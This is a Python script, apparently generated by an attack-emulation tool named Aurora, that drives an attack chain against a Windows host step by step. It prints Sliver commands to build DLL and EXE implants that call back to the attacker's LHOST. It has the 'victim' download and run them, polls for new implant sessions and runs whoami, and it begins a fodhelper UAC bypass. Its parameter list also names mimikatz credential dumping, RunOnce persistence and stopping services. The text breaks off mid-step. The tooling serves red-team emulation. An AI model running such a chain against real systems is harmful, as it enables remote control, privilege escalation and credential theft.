import argparse
import asyncio
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List

import yaml
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from rich.table import Table

from attack_executor.post_exploit.Sliver import PowerShellNonTerminatingWarning

console = Console()
user_params: Dict[str, str] = {}

# Runtime configuration set from CLI args. Touched ONLY by main() and the
# helper functions below — step bodies never check it directly.
_RUNTIME = {
    "params": {},        # contents of --params file (dict with 'pddl_bindings' / 'steps')
    "no_prompt": False,  # --no-prompt flag
}

# Each entry: {idx, name, start, end} where start/end are monotonic seconds.
# Populated by _step_started / _step_finished bracketing each included step.
_STEP_RECORDS: List[dict] = []
_RUN_START_TS = None

# (step_id, param_name, pddl_index_or_empty) tuples for every required
# parameter — populated by the Jinja template at generation time so the
# preflight check knows what to look for. `pddl_index` is "" for free
# (non-PDDL-bound) params, otherwise the PDDL variable name.
_REQUIRED_PARAMS = [
    ("1_sliver-payload-windows-dll", "LHOST", ""),    ("1_sliver-payload-windows-dll", "LPORT", ""),    ("1_sliver-payload-windows-dll", "SAVE_PATH", "string0_var_in_plan"),    ("2_simulate-download-file", "LHOST", ""),    ("2_simulate-download-file", "LPORT", ""),    ("2_simulate-download-file", "SAVE_PATH", "string4_var_in_plan"),    ("3_simulate-execute-dll-windows", "DLL_PATH", "string4_var_in_plan"),    ("6_sliver-payload-windows-exe", "LHOST", ""),    ("6_sliver-payload-windows-exe", "LPORT", ""),    ("6_sliver-payload-windows-exe", "SAVE_PATH", "string1_var_in_plan"),    ("7_simulate-download-execute-file", "LHOST", ""),    ("7_simulate-download-execute-file", "LPORT", ""),    ("7_simulate-download-execute-file", "SAVE_PATH", "string2_var_in_plan"),    ("9_art-t1548_002-fodhelper-uac-bypass-ps", "EXE_PATH", "string2_var_in_plan"),    ("12_art-t1003_001-mimikatz-powershell", "remote_script", ""),    ("13_art-t1547_001-powershell-runonce", "reg_key_path", ""),    ("13_art-t1547_001-powershell-runonce", "command_to_execute", "string3_var_in_plan"),    ("15_art-t1489-net-stop-service", "service_name", ""),]


def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )


def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")


def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    """Yes/no prompt for chain-progression confirmations ('Keep going?',
    'Execute this command?').

    - In --no-prompt mode, returns True silently.
    - In interactive mode, answering `n` aborts the chain (clean exit
      with a summary). The user can use this to pause / cancel
      mid-execution.
    """
    if _RUNTIME["no_prompt"]:
        return True
    ok = Confirm.ask(
        f"[bold bright_cyan]{prompt}[/]",
        default=True,
        show_default=True,
    )
    if not ok:
        console.print(
            "[yellow]\n⏹  Chain aborted by user. Run the script again to retry from the start.[/]"
        )
        _print_chain_summary(aborted=True)
        sys.exit(0)
    return True


def wait_for_human(prompt: str) -> bool:
    """Always-blocking confirmation for Human steps. Loops on `n` because
    the chain cannot proceed until the human has actually completed the
    manual action — `n` means "not yet, ask me again" rather than
    "skip this step" or "abort"."""
    while True:
        ok = Confirm.ask(
            f"[bold red]⏸  {prompt}[/]",
            default=True,
            show_default=True,
        )
        if ok:
            return True
        console.print(
            "[yellow]  ↻ Re-prompting — the chain can't continue until the manual step is done.[/]"
        )


def _lookup_params_value(step_id: str, name: str, pddl_index: str):
    """Look up a value in the params file. Precedence:
    pddl_bindings[pddl_index] > steps[step_id][name] > None."""
    pf = _RUNTIME["params"] or {}
    if pddl_index:
        v = pf.get("pddl_bindings", {}).get(pddl_index)
        if v is not None:
            return v, f"params file: pddl_bindings.{pddl_index}"
    v = pf.get("steps", {}).get(step_id, {}).get(name)
    if v is not None:
        return v, "params file"
    return None, None


def _get_param_input(
    step_id: str,
    name: str,
    pddl_index: str,
    action_default: str,
    required: bool,
) -> str:
    """Resolve one parameter's value with this precedence:
        1. params file (pddl_bindings or steps section)
        2. action YAML default
        3. interactive prompt (skipped in --no-prompt mode)

    In --no-prompt mode, returns the resolved value without prompting.
    Preflight has already guaranteed required params are present.
    """
    pf_value, pf_source = _lookup_params_value(step_id, name, pddl_index)
    current = pf_value if pf_value is not None else (action_default or "")

    if _RUNTIME["no_prompt"]:
        # Echo the resolved value so the operator can see what's being
        # used without having to open the params file alongside.
        resolved = str(current) if current is not None else ""
        source = pf_source if pf_value is not None else "action default"
        console.print(
            f"  [green]✓ Using value:[/] [bold]{resolved or '<empty>'}[/] "
            f"[dim]({source})[/]"
        )
        return resolved

    # Build the prompt with source labelling so the user can see where the
    # suggested value came from.
    if pf_value is not None:
        hint = f"current: {pf_value!r} [{pf_source}], required: {required}"
    elif action_default:
        hint = f"default: {action_default!r} [action default], required: {required}"
    else:
        hint = f"default: <none>, required: {required}"

    while True:
        user_input = console.input(
            f"[bold]➤ Enter value for {name} ({hint}): [/]"
        )
        if not user_input:
            user_input = str(current) if current is not None else ""
        if user_input or not required:
            return user_input
        console.print(f"[bold red]  ⚠ {name} is required. Please enter a value.[/]")


def _preflight_check_required_params() -> None:
    """When --no-prompt is on, verify every required param has a value in
    the params file. If not, list what's missing and exit so the user can
    fix the file instead of hitting an error mid-execution.

    PDDL-bound runtime entities like Sliver session IDs (variables named
    `executor*_var_in_plan`) are excluded — those genuinely can't be set
    ahead of time."""
    pf = _RUNTIME["params"] or {}
    missing = []
    for step_id, name, pddl_index in _REQUIRED_PARAMS:
        if pddl_index.startswith("executor"):
            # Sliver session selection happens at runtime; not preflightable.
            continue
        v, _ = _lookup_params_value(step_id, name, pddl_index)
        if v is None:
            location = (
                f"pddl_bindings.{pddl_index}"
                if pddl_index else
                f"steps.{step_id}.{name}"
            )
            missing.append((step_id, name, location))

    if missing:
        console.print(
            f"[bold red]❌ Cannot run with --no-prompt: "
            f"{len(missing)} required param(s) not set in the params file.[/]"
        )
        for step_id, name, location in missing:
            console.print(f"  [yellow]·[/] {step_id:<40} [bold]{name}[/]  expected at: [dim]{location}[/]")
        console.print(
            "\n[bold]Fill these into the params file then retry.[/]"
        )
        sys.exit(1)


def _step_started(idx, name: str) -> None:
    """Record the start of a step (after its header prints, just before
    parameter prompting). Time stamp is monotonic seconds + wall clock."""
    _STEP_RECORDS.append({
        "idx": idx,
        "name": name,
        "start_mono": time.monotonic(),
        "start_wall": datetime.now(timezone.utc),
        "end_mono": None,
        "end_wall": None,
        "status": "ok",
        "error": "",
    })


def _step_finished(idx) -> None:
    """Record the end of a step (after its final confirm_action /
    wait_for_human returns)."""
    if not _STEP_RECORDS:
        return
    rec = _STEP_RECORDS[-1]
    if rec["idx"] != idx:
        return  # defensive: out-of-order, skip
    rec["end_mono"] = time.monotonic()
    rec["end_wall"] = datetime.now(timezone.utc)


def _step_uncertain(warn: Exception) -> None:
    """Flag the currently-running step as uncertain — the underlying
    tool exited with a success status but produced signals that a real
    APT operator would review before treating it as success (e.g. non-
    terminating Error/Warning stream content from a PowerShell script).
    Chain continues to the next step. The summary marks this "?"
    instead of ✓ / ✗."""
    if not _STEP_RECORDS:
        return
    rec = _STEP_RECORDS[-1]
    rec["status"] = "uncertain"
    _msg = str(warn) or repr(warn)
    rec["error"] = _msg if len(_msg) <= 2000 else _msg[:1997] + "…"
    _bar = "━" * 68
    console.print()
    console.print(
        f"[bold yellow]{_bar}\n"
        f"  ? Step {rec['idx']} uncertain: {rec['name']}\n"
        f"{_bar}[/]"
    )
    console.print(f"[yellow]{_msg}[/]")
    console.print(f"[bold yellow]{_bar}[/]")
    console.print()


def _step_failed(err: Exception) -> None:
    """Flag the currently-running step as failed, record a short error
    string, and print a visually-bordered failure box so the boundary
    stays visible in the live log stream even when tracebacks / cmd
    output have muddied it. Chain continues to the next step — the
    CI-style principle is 'run everything, report at the end' rather
    than hard-crashing the whole run on one hiccup."""
    if not _STEP_RECORDS:
        return
    rec = _STEP_RECORDS[-1]
    rec["status"] = "failed"
    _msg = str(err) or repr(err)
    rec["error"] = _msg if len(_msg) <= 2000 else _msg[:1997] + "…"
    _bar = "━" * 68
    console.print()
    console.print(
        f"[bold red]{_bar}\n"
        f"  ✗ Step {rec['idx']} failed: {rec['name']}\n"
        f"{_bar}[/]"
    )
    console.print(f"[red]{_msg}[/]")
    console.print(f"[bold red]{_bar}[/]")
    console.print()


def _fmt_dur(seconds) -> str:
    if seconds is None:
        return "—"
    if seconds < 60:
        return f"{seconds:.1f}s"
    m, s = divmod(int(seconds), 60)
    return f"{m}m {s}s"


def _print_chain_summary(aborted: bool = False) -> None:
    """End-of-chain summary: each step's name, start/end wall-clock time,
    and duration. Total run time at the bottom."""
    if not _STEP_RECORDS:
        return
    bar = "═" * 70
    console.print()
    console.print(bar)
    title = "Attack Chain Run Summary" + ("  (ABORTED)" if aborted else "")
    console.print(f"  [bold]{title}[/]")
    console.print(bar)

    table = Table(show_header=True, header_style="bold", box=None, pad_edge=False)
    table.add_column("Step", justify="right", style="dim")
    table.add_column("Name")
    table.add_column("Start", style="dim")
    table.add_column("End",   style="dim")
    table.add_column("Duration", justify="right")
    table.add_column("Status", justify="center")

    for rec in _STEP_RECORDS:
        if rec["end_mono"] is not None:
            dur = rec["end_mono"] - rec["start_mono"]
            end_str = rec["end_wall"].strftime("%Y-%m-%d %H:%M:%S UTC")
            if rec["status"] == "failed":
                status = "[red]✗[/]"
            elif rec["status"] == "uncertain":
                status = "[yellow]?[/]"
            else:
                status = "[green]✓[/]"
        else:
            dur = None
            status = "[red]✗[/]" if aborted else "[yellow]…[/]"
            end_str = "—"
        table.add_row(
            str(rec["idx"]),
            rec["name"] or "<unnamed>",
            rec["start_wall"].strftime("%Y-%m-%d %H:%M:%S UTC"),
            end_str,
            _fmt_dur(dur),
            status,
        )
    console.print(table)

    # Failure details — one short line per failed step so the operator
    # doesn't have to scroll back through the run log to find them.
    _failed = [r for r in _STEP_RECORDS if r["status"] == "failed"]
    if _failed:
        console.print()
        console.print(f"  [bold red]Failed steps ({len(_failed)}):[/]")
        for rec in _failed:
            console.print(
                f"  [red]✗[/] Step {rec['idx']}: {rec['name']}"
            )
            if rec["error"]:
                # Re-indent every line (Rich's console.print does not
                # auto-indent embedded newlines).
                console.print("\n".join(
                    "      " + ln for ln in rec["error"].splitlines()))

    # Uncertain details — same shape, yellow, so review candidates stand out
    # separately from confirmed failures.
    _uncertain = [r for r in _STEP_RECORDS if r["status"] == "uncertain"]
    if _uncertain:
        console.print()
        console.print(f"  [bold yellow]Uncertain steps ({len(_uncertain)}):[/]")
        for rec in _uncertain:
            console.print(
                f"  [yellow]?[/] Step {rec['idx']}: {rec['name']}"
            )
            if rec["error"]:
                console.print("\n".join(
                    "      " + ln for ln in rec["error"].splitlines()))

    total = time.monotonic() - (_RUN_START_TS or time.monotonic())
    finished = sum(1 for r in _STEP_RECORDS if r["end_mono"] is not None)
    _ok = sum(1 for r in _STEP_RECORDS if r["status"] == "ok" and r["end_mono"] is not None)
    _uncertain_n = sum(1 for r in _STEP_RECORDS if r["status"] == "uncertain")
    _bad = sum(1 for r in _STEP_RECORDS if r["status"] == "failed")
    console.print()
    console.print(
        f"  [bold]Total:[/] {finished} steps executed "
        f"([green]{_ok} ✓[/], [yellow]{_uncertain_n} ?[/], [red]{_bad} ✗[/]) "
        f"in [bold]{_fmt_dur(total)}[/]"
    )
    console.print(bar)


def _load_params_file(path: str) -> dict:
    p = Path(path)
    if not p.exists():
        console.print(f"[bold red]❌ Params file not found: {path}[/]")
        sys.exit(1)
    try:
        data = yaml.safe_load(p.read_text())
    except yaml.YAMLError as e:
        console.print(f"[bold red]❌ Failed to parse params file {path}: {e}[/]")
        sys.exit(1)
    if not isinstance(data, dict):
        console.print(f"[bold red]❌ Params file must be a YAML mapping; got {type(data).__name__}[/]")
        sys.exit(1)
    return data


async def main():
    parser = argparse.ArgumentParser(
        description="Execute an Aurora-generated attack chain.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--params",
        help="Path to a YAML params file to pre-fill parameter values.",
    )
    parser.add_argument(
        "--no-prompt",
        action="store_true",
        help="Don't prompt for parameters that are in the params file or "
             "have an action default. Requires --params. Human steps and "
             "Sliver session selections still pause for user action.",
    )
    args = parser.parse_args()

    if args.no_prompt and not args.params:
        parser.error("--no-prompt requires --params")

    if args.params:
        _RUNTIME["params"] = _load_params_file(args.params)
    _RUNTIME["no_prompt"] = args.no_prompt

    if args.no_prompt:
        _preflight_check_required_params()
        console.print(
            f"[bold green]✓ Preflight passed: all required params resolved.[/]"
        )

    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Aurora-executor/config.ini")

    pddl_parameters = {}

    # Dictionary to track executors and their relationships
    # Each executor has: type, isDerivedExecutor, RealSessionID, parentExecutor
    executor_dict = {}

    # Chain-level record of every meterpreter session id observed so far.
    # Used by the `Meterpreter Session Establish` step-type to detect
    # *new* sessions across the whole run rather than just "new since I
    # started polling" — payloads often call back BEFORE the operator
    # finishes the Human step, so per-step snapshots would treat those
    # already-registered sessions as baseline and never flag them.
    _seen_meterpreter_sessions: set = set()

    # Sliver counterpart: same chain-level "already-observed" semantics
    # for `Sliver Session Establish`. Populated by
    # `sliver_session_wait.j2`.
    _seen_sliver_sessions: set = set()

    global _RUN_START_TS
    _RUN_START_TS = time.monotonic()
    _step_started(1, "Build DLL Sliver implant")

    console.print(f"[bold cyan]\n📌[Sliver Console] Step 1[/]")
    console.print(f"[bold cyan]\n📌[Name] Build DLL Sliver implant[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")
    user_params["LHOST"] = _get_param_input("1_sliver-payload-windows-dll", "LHOST", "", '', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")
    user_params["LPORT"] = _get_param_input("1_sliver-payload-windows-dll", "LPORT", "", '', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")
    if "string0_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string0_var_in_plan"]))
        user_params["SAVE_PATH"] = pddl_parameters["string0_var_in_plan"]
    else:
        user_params["SAVE_PATH"] = _get_param_input("1_sliver-payload-windows-dll", "SAVE_PATH", "string0_var_in_plan", '', True)
        pddl_parameters["string0_var_in_plan"] = user_params["SAVE_PATH"]
    _sliver_console_cmd = f"""sliver > generate --mtls {user_params['LHOST']}:{user_params['LPORT']} --os windows --arch 64bit --format shared --save {user_params['SAVE_PATH']}
sliver > mtls --lport {user_params['LPORT']}
"""
    console.print(f"[bold cyan]\n[Sliver Console] Commands to run (one per line, copy each separately):[/]")
    # Print each command on its own line via plain print so the terminal
    # doesn't soft-wrap a long line that would then copy with an embedded
    # newline (which Sliver would reject as "missing string value").
    for _cmd_line in _sliver_console_cmd.splitlines():
        if _cmd_line.strip():
            print(f"  {_cmd_line}")
    console.print(f"[bold yellow]  ⚠ This step requires manual Sliver console interaction.[/]")
    confirm_action("Have you completed this Sliver console step?")
    _step_finished(1)
    _step_started(2, "Simulate the victim download a file on its machine")

    console.print(f"[bold cyan]\n📌[Human] Step 2[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim download a file on its machine[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the http file server (typically the attacker machine)")
    user_params["LHOST"] = _get_param_input("2_simulate-download-file", "LHOST", "", '', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: port of the http file server")
    user_params["LPORT"] = _get_param_input("2_simulate-download-file", "LPORT", "", 8000, True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")
    if "string4_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string4_var_in_plan"]))
        user_params["SAVE_PATH"] = pddl_parameters["string4_var_in_plan"]
    else:
        user_params["SAVE_PATH"] = _get_param_input("2_simulate-download-file", "SAVE_PATH", "string4_var_in_plan", '', True)
        pddl_parameters["string4_var_in_plan"] = user_params["SAVE_PATH"]
    _human_action = f"""(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server {user_params['LPORT']}

(On victim's machine)
1. Open {user_params['LHOST']}:{user_params['LPORT']} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to {user_params['SAVE_PATH']}
"""
    console.print(f"[bold yellow]\n⚠ Human action required:[/]")
    console.print(Panel(_human_action, title="[bold red]Manual Step[/]", expand=False))
    wait_for_human("Have you completed this manual step?")
    _step_finished(2)
    _step_started(3, "Simulate the victim execute a DLL file on its machine")

    console.print(f"[bold cyan]\n📌[Human] Step 3[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim execute a DLL file on its machine[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: DLL_PATH[/]")
    console.print(f"  Description: Saved path of the DLL file")
    if "string4_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string4_var_in_plan"]))
        user_params["DLL_PATH"] = pddl_parameters["string4_var_in_plan"]
    else:
        user_params["DLL_PATH"] = _get_param_input("3_simulate-execute-dll-windows", "DLL_PATH", "string4_var_in_plan", '', True)
        pddl_parameters["string4_var_in_plan"] = user_params["DLL_PATH"]
    _human_action = f"""(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, use PowerShell or Command Prompt)
regsvr32 {user_params['DLL_PATH']}
"""
    console.print(f"[bold yellow]\n⚠ Human action required:[/]")
    console.print(Panel(_human_action, title="[bold red]Manual Step[/]", expand=False))
    wait_for_human("Have you completed this manual step?")
    _step_finished(3)
    _step_started(4, "Execute a Sliver Implant Payload")

    console.print(f"[bold cyan]\n📌[Session Check] Step 4[/]")
    console.print(f"[bold cyan]📌[Name] Execute a Sliver Implant Payload[/]")
    # Sliver mirror of the meterpreter observation gate. Poll for a
    # sliver session that hasn't been observed on any earlier step;
    # the chain-level `_seen_sliver_sessions` set makes this robust
    # even when the payload calls back BEFORE the operator finishes
    # the human step (a common case with fast implants).
    if 'sliver_executor' not in dir():
        from attack_executor.post_exploit.Sliver import SliverExecutor
        sliver_executor = SliverExecutor(config=config)
    while True:
        console.print(
            f"[bold cyan][Session Check] Polling for new sliver session (30s)…[/]"
        )
        _deadline = time.time() + 30
        _all_sessions = {}
        _fresh_ids = set()
        while time.time() < _deadline:
            _all_sessions = await sliver_executor.get_sessions()
            _now_ids = set(str(_sid) for _sid in _all_sessions.keys())
            _fresh_ids = _now_ids - _seen_sliver_sessions
            if _fresh_ids:
                break
            await asyncio.sleep(1)
        if _fresh_ids:
            # Same explicit-id UX as the meterpreter gate: type the id
            # of the specific session to accept. Robust to the multi-
            # callback race and future-friendly for the eventual
            # session→executor binding TODO.
            _prev = sorted(_seen_sliver_sessions)
            _new = sorted(_fresh_ids)
            console.print(f"[green]  Previously known sessions:[/] {_prev if _prev else '(none)'}")
            console.print(f"[bold green]  Newly detected session(s):[/]")
            for _sid in _new:
                _s = _all_sessions.get(_sid)
                if _s is not None:
                    console.print(
                        f"    [{_sid}] {_s.Name}@{_s.Hostname} — {_s.Username} ({_s.OS})"
                    )
                else:
                    console.print(f"    [{_sid}] (details unavailable)")
            _default_pick = _new[0]
            while True:
                _picked = (console.input(
                    f"[bold]➤ Session id to accept (default: {_default_pick}, or 'n' to abort chain): [/]"
                ) or _default_pick).strip()
                if _picked.lower() == "n":
                    console.print("[yellow]\n⏹  Chain aborted at session check.[/]")
                    _print_chain_summary(aborted=True)
                    sys.exit(0)
                if _picked in _fresh_ids:
                    break
                console.print(
                    f"[yellow]  '{_picked}' is not one of the newly detected session ids "
                    f"({sorted(_fresh_ids)}). Try again.[/]"
                )
            # Only mark the accepted session as seen; unpicked new
            # sessions stay "fresh" for the next session-check step.
            _seen_sliver_sessions.add(_picked)
            break
        console.print(f"[bold yellow]⚠ No new sliver session after 30s.[/]")
        _choice = (console.input(
            "[bold]➤ Retry polling? \\[r=retry / n=stop and print summary] (r): [/]"
        ) or "r").strip().lower()
        if _choice.startswith("n"):
            console.print("[yellow]\n⏹  Chain aborted at session check.[/]")
            _print_chain_summary(aborted=True)
            sys.exit(0)
    _step_finished(4)
    _step_started(5, "User Context Verification")

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 5[/]")
    console.print(f"[bold cyan]\n📌[Name] User Context Verification[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")
    if "executor4_var_in_plan" in executor_dict:
        console.print(f"  [green]✓ Using stored value:[/] " + str(executor_dict["executor4_var_in_plan"]["RealSessionID"]))
    else:
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)
        selected = await sliver_executor.select_sessions()
        executor_dict["executor4_var_in_plan"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected,
            "parentExecutor": None
        }
    user_params["executor"] = executor_dict["executor4_var_in_plan"]["RealSessionID"]
    pddl_parameters["executor4_var_in_plan"] = executor_dict["executor4_var_in_plan"]["RealSessionID"]
    if 'sliver_executor' not in dir():
        from attack_executor.post_exploit.Sliver import SliverExecutor
        sliver_executor = SliverExecutor(config=config)
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: whoami[/]")
    confirm_action()
    try:
        await sliver_executor.whoami(session_id=str(user_params["executor"]))
    except Exception as e:
        _step_failed(e)
    _step_finished(5)
    _step_started(6, "Build the executable file of a Sliver implant (for Windows)")

    console.print(f"[bold cyan]\n📌[Sliver Console] Step 6[/]")
    console.print(f"[bold cyan]\n📌[Name] Build the executable file of a Sliver implant (for Windows)[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")
    user_params["LHOST"] = _get_param_input("6_sliver-payload-windows-exe", "LHOST", "", '', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")
    user_params["LPORT"] = _get_param_input("6_sliver-payload-windows-exe", "LPORT", "", '', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")
    if "string1_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string1_var_in_plan"]))
        user_params["SAVE_PATH"] = pddl_parameters["string1_var_in_plan"]
    else:
        user_params["SAVE_PATH"] = _get_param_input("6_sliver-payload-windows-exe", "SAVE_PATH", "string1_var_in_plan", '', True)
        pddl_parameters["string1_var_in_plan"] = user_params["SAVE_PATH"]
    _sliver_console_cmd = f"""sliver > generate --mtls {user_params['LHOST']}:{user_params['LPORT']} --os windows --arch 64bit --format exe --save {user_params['SAVE_PATH']}
sliver > mtls --lport {user_params['LPORT']}
"""
    console.print(f"[bold cyan]\n[Sliver Console] Commands to run (one per line, copy each separately):[/]")
    # Print each command on its own line via plain print so the terminal
    # doesn't soft-wrap a long line that would then copy with an embedded
    # newline (which Sliver would reject as "missing string value").
    for _cmd_line in _sliver_console_cmd.splitlines():
        if _cmd_line.strip():
            print(f"  {_cmd_line}")
    console.print(f"[bold yellow]  ⚠ This step requires manual Sliver console interaction.[/]")
    confirm_action("Have you completed this Sliver console step?")
    _step_finished(6)
    _step_started(7, "Simulate the victim download and execute malicious payload file")

    console.print(f"[bold cyan]\n📌[Human] Step 7[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim download and execute malicious payload file[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the http file server (typically the attacker machine)")
    user_params["LHOST"] = _get_param_input("7_simulate-download-execute-file", "LHOST", "", '', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: port of the http file server")
    user_params["LPORT"] = _get_param_input("7_simulate-download-execute-file", "LPORT", "", 8000, True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")
    if "string2_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string2_var_in_plan"]))
        user_params["SAVE_PATH"] = pddl_parameters["string2_var_in_plan"]
    else:
        user_params["SAVE_PATH"] = _get_param_input("7_simulate-download-execute-file", "SAVE_PATH", "string2_var_in_plan", '', True)
        pddl_parameters["string2_var_in_plan"] = user_params["SAVE_PATH"]
    _human_action = f"""(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server {user_params['LPORT']}

(On victim's machine)
1. Open {user_params['LHOST']}:8000 in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to {user_params['SAVE_PATH']} (If on a Linux machine, you also need to chmod the file)
"""
    console.print(f"[bold yellow]\n⚠ Human action required:[/]")
    console.print(Panel(_human_action, title="[bold red]Manual Step[/]", expand=False))
    wait_for_human("Have you completed this manual step?")
    _step_finished(7)
    _step_started(8, "Execute PowerShell Command")

    console.print(f"[bold cyan]\n📌[Sliver Session Derive] Step 8[/]")
    console.print(f"[bold cyan]📌[Name] Execute PowerShell Command[/]")
    # This step establishes a `DerivedExecutorID` — a synthetic
    # Command Prompt / PowerShell / Bash / Sh executor rooted in an
    # existing Sliver session. Sliver's cmd()/powershell()/shell() are
    # one-shot at the RPC level, so there's nothing to "invoke" here;
    # aurora treats derivation as pure PDDL bookkeeping that lets
    # downstream Command Prompt Executor / Powershell Executor actions
    # satisfy their session-flavour preconditions. All the work is in
    # the generic_params loop below (session_select picks/reuses the
    # parent sliver session, derived_executor wires up executor_dict).
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor_parent[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")
    if "executor4_var_in_plan" in executor_dict:
        console.print(f"  [green]✓ Using stored value:[/] " + str(executor_dict["executor4_var_in_plan"]["RealSessionID"]))
    else:
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)
        selected = await sliver_executor.select_sessions()
        executor_dict["executor4_var_in_plan"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected,
            "parentExecutor": None
        }
    user_params["executor_parent"] = executor_dict["executor4_var_in_plan"]["RealSessionID"]
    pddl_parameters["executor4_var_in_plan"] = executor_dict["executor4_var_in_plan"]["RealSessionID"]
    executor_dict["executor2_var_in_plan"] = {
        "type": executor_dict["executor4_var_in_plan"]["type"] if "executor4_var_in_plan" in executor_dict else "Sliver Executor",
        "isDerivedExecutor": True,
        "RealSessionID": executor_dict["executor4_var_in_plan"]["RealSessionID"] if "executor4_var_in_plan" in executor_dict else None,
        "parentExecutor": "executor4_var_in_plan"
    }
    # Also expose the derived session id via `pddl_parameters` so
    # downstream steps that look up the executor slot the standard
    # way (Command Prompt Executor, PowerShell Executor, …) find it
    # without an interactive prompt. executor_dict alone isn't
    # enough — the shell/powershell templates check pddl_parameters.
    pddl_parameters["executor2_var_in_plan"] = executor_dict["executor2_var_in_plan"]["RealSessionID"]
    console.print(
        f"[bold green]  ↳ Derived executor_derived executor from Sliver session "
        f"{executor_dict['executor2_var_in_plan']['RealSessionID']}[/]"
    )
    _step_finished(8)
    _step_started(9, "Bypass UAC using Fodhelper - PowerShell")

    console.print(f"[bold cyan]\n📌[Powershell Executor] Step 9[/]")
    console.print(f"[bold cyan]\n📌[Name] Bypass UAC using Fodhelper - PowerShell[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The Powershell session ID (unelevated, admin-group user) used to invoke the UAC-bypass sequence.")
    if "executor2_var_in_plan" in executor_dict:
        console.print(f"  [green]✓ Using stored value:[/] " + str(executor_dict["executor2_var_in_plan"]["RealSessionID"]))
    else:
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)
        selected = await sliver_executor.select_sessions()
        executor_dict["executor2_var_in_plan"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected,
            "parentExecutor": None
        }
    user_params["executor"] = executor_dict["executor2_var_in_plan"]["RealSessionID"]
    pddl_parameters["executor2_var_in_plan"] = executor_dict["executor2_var_in_plan"]["RealSessionID"]
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: EXE_PATH[/]")
    console.print(f"  Description: Path of the executable on the victim host that fodhelper will run with elevated integrity. Common chain use is to point at a pre-staged Meterpreter / Sliver payload. Default `cmd.exe` spawns an elevated command prompt — useful for interactive testing of the bypass itself.")
    if "string2_var_in_plan" in pddl_parameters:
